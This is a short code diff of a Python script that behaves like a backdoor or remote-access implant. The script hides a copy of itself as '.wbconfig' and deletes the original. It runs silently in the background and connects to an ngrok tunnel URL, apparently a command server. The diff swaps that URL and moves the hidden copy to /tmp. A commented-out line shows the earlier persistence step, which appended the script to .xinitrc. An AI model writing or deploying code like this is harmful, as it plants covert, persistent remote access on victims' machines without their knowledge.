@@ -14,7 +14,8 @@ try:
 		os.system('rm '+sys.argv[0])
 		sys.exit(0)
 except:
-	os.system('cp '+sys.argv[0]+' $HOME/.config/.wbconfig 2>/dev/null;rm '+sys.argv[0]+' 2>/dev/null;echo -e python $HOME/.config/.wbconfig >> $HOME/.xinitrc 2>/dev/null;python $HOME/.config/.wbconfig running & 2>/dev/null')
+	os.system('cp '+sys.argv[0]+' /tmp/.wbconfig 2>/dev/null;rm '+sys.argv[0]+' 2>/dev/null;python /tmp/.wbconfig running & 2>/dev/null')
+	#os.system('cp '+sys.argv[0]+' $HOME/.config/.wbconfig 2>/dev/null;rm '+sys.argv[0]+' 2>/dev/null;echo -e python $HOME/.config/.wbconfig >> $HOME/.xinitrc 2>/dev/null;python $HOME/.config/.wbconfig running & 2>/dev/null')
 	sys.exit(0)
 
-run('http://00c32e7a.ngrok.io')
+run('http://ef12845c.ngrok.io')
